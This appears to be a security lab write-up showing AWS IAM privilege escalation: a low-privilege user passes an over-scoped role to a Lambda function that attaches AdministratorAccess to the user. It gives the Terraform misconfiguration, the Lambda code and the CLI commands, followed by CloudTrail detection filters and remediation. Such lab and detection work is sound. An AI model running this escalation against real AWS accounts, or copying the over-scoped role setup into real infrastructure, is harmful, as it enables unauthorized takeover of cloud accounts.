# IAM Privilege Escalation via PassRole + Lambda

**Objective:** turn a low-privilege IAM user into full account administrator by using a
Lambda function as the code-execution vehicle for a higher-privileged role it is allowed to
pass. Secondary: show that an over-privileged, in-account-assumable role amplifies any
credential compromise to PowerUser.
**AWS services:** IAM, STS, Lambda.

> This exploits the primitives from [`02-iam-attack-primitives`](../02-iam-attack-primitives/).
> Primitive C — a low-priv user with `iam:PassRole` + `lambda:CreateFunction` +
> `lambda:InvokeFunction` on `*` — is only dangerous when a **Lambda-assumable, high-privileged
> role** exists to pass. Phase 2 adds exactly that as **misconfig D**: an over-scoped Lambda
> execution role, `sigsec-lab-lambda-exec`, that trusts `lambda.amazonaws.com` and carries
> `IAMFullAccess`. Without such a role the PassRole+Lambda pair cannot escalate; with it, it is
> a full path to admin.

## Setup

Misconfig D (Terraform, account ID redacted):

```hcl
resource "aws_iam_role" "lambda_exec" {
  name = "sigsec-lab-lambda-exec"
  assume_role_policy = {                    # the Lambda SERVICE can assume it
    Principal = { Service = "lambda.amazonaws.com" }
    Action    = "sts:AssumeRole"
  }
}
# + attach arn:aws:iam::aws:policy/IAMFullAccess   # over-scoped execution role
```

Starting foothold: an access key for `sigsec-lab-lowpriv` (primitive C). Its only powers are
`iam:PassRole`, `lambda:CreateFunction`, `lambda:InvokeFunction` on `Resource = "*"` — it
cannot touch IAM directly:

```
$ aws iam list-users --profile lowpriv
An error occurred (AccessDenied) ... not authorized to perform: iam:ListUsers
```

## Attack

The attacker writes a Lambda whose code runs at the *passed* role's privilege:

```python
# lambda_function.py
import boto3
def handler(event, context):
    boto3.client("iam").attach_user_policy(
        UserName="sigsec-lab-lowpriv",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
    )
    return {"escalated": "sigsec-lab-lowpriv"}
```

Create the function **as the low-priv user**, passing the high-priv exec role (the
`iam:PassRole` + `lambda:CreateFunction` pair in action), then invoke it:

```
$ zip -j privesc.zip lambda_function.py
$ aws lambda create-function --function-name sigsec-lab-privesc \
    --runtime python3.12 --handler lambda_function.handler \
    --role arn:aws:iam::<ACCOUNT_ID>:role/sigsec-lab-lambda-exec \
    --zip-file fileb://privesc.zip --profile lowpriv
$ aws lambda invoke --function-name sigsec-lab-privesc --profile lowpriv out.json
    StatusCode: 200
$ cat out.json
    {"escalated": "sigsec-lab-lowpriv"}
```

Running as `sigsec-lab-lambda-exec` (IAMFullAccess), the function attaches
`AdministratorAccess` to the attacker's own user. The same call that was denied at the start
now succeeds:

```
$ aws iam list-attached-user-policies --user-name sigsec-lab-lowpriv   # admin view
    AdministratorAccess
$ aws iam list-users --profile lowpriv
    sigsec-lab-cli   sigsec-lab-lowpriv        # was AccessDenied — now full admin
```

### Secondary: over-privileged role (primitive A)

Primitive A (`sigsec-lab-overpriv`, `PowerUserAccess`, trust = account root) is not externally
assumable, but **any in-account principal that can call `sts:AssumeRole`** inherits PowerUser:

```
$ aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT_ID>:role/sigsec-lab-overpriv \
    --role-session-name demo                # -> temporary PowerUser credentials
$ aws ec2 describe-instances                # authorized (PowerUser)
$ aws iam create-user --user-name x
    An error occurred (AccessDenied) ... iam:CreateUser    # PowerUser != admin
```

The ceiling is the lesson: `PowerUserAccess` grants nearly everything **except** `iam:*`, so
role A alone is blast-radius amplification, not a route to IAM control — the PassRole + Lambda
chain above is what actually reaches admin. (The low-priv user holds no `sts:AssumeRole`, so it
cannot assume A directly; A is shown from an AssumeRole-capable principal to characterize what
the over-broad trust grants.)

## What the attacker gains

- **Full account administrator** from a user that began with three narrow Lambda/PassRole
  permissions and no IAM access. The hinge is the wildcard `iam:PassRole` combined with a
  Lambda-assumable, over-privileged execution role.
- PowerUser across the account from any in-account foothold that can assume the over-broad role.

## Detection

Detected with **CloudTrail → CloudWatch Logs metric filters + alarms** (Phase 3a, hand-rolled,
$0). A multi-region trail with global events on delivers into one CloudWatch Logs group in the
operating region; metric-filter patterns match the attack's own API calls and drive alarms. No
data events are needed — every signal is a management event (perpetual-free). All three fired on
a live re-run (each alarm → `ALARM`, confirmed by metric `Sum >= 1` and the alarm state
transition; no SNS email subscription required).

**1 — low-priv user creates a Lambda passing the high-priv role** (the PassRole+Lambda hinge):

```
{ ($.eventName = "CreateFunction20150331")
  && ($.userIdentity.userName = "sigsec-lab-lowpriv")
  && ($.requestParameters.role = "*sigsec-lab-lambda-exec") }
```

Two gotchas each cost a silent no-op if missed: the CloudTrail event name is **version-suffixed**
(`CreateFunction20150331`, not `CreateFunction`), and **`iam:PassRole` emits no event of its own**
— it is an authorization check, so the passed role appears only as `requestParameters.role`
*inside* the `CreateFunction` record. A filter on `CreateFunction`, or on a `PassRole` event,
never fires.

**2 — AdministratorAccess attached by the Lambda execution role** (the escalation payload):

```
{ ($.eventName = "AttachUserPolicy")
  && ($.requestParameters.policyArn = "arn:aws:iam::aws:policy/AdministratorAccess")
  && ($.userIdentity.sessionContext.sessionIssuer.userName = "sigsec-lab-lambda-exec") }
```

The `sessionIssuer` clause is what separates the attack from benign administration — a
legitimate operator granting `AdministratorAccess` carries a different issuer; without it the
rule over-fires on normal admin activity (observed a benign attach during setup).

**3 — any principal assumes the over-privileged role:**

```
{ ($.eventName = "AssumeRole")
  && ($.requestParameters.roleArn = "*sigsec-lab-overpriv") }
```

Kept deliberately broad (all callers) and triaged on the caller, because the risk is *who*
assumed it. The Lambda service's own assume of the exec role carries a different `roleArn` and is
excluded.

Wiring: metric filter → custom metric (`Sum`) → alarm (`>= 1` over 1 min,
`treatMissingData = notBreaching`) → SNS. Note the CloudTrail→CloudWatch delivery lag (~5-15 min)
— a check before then is a false miss, not a gap. The IAM `AttachUserPolicy` above is a *global*
event; a multi-region trail still lands it in the single regional log group, so all three signals
are visible from one place. Rules live as Terraform (`detections/`, account ID redacted). The
managed-service comparison (GuardDuty / Security Hub) is a deliberate later step.

## Remediation

_(added in Phase 4)_ — Constrain `iam:PassRole` to specific role ARNs with an
`iam:PassedToService` condition (`lambda.amazonaws.com` only, and only the roles Lambda should
use). Scope the Lambda execution role to least privilege — never `IAMFullAccess` /
`AdministratorAccess` on a function low-priv users can create. Scope A's trust to specific
principals and replace `PowerUserAccess` with a least-privilege policy.
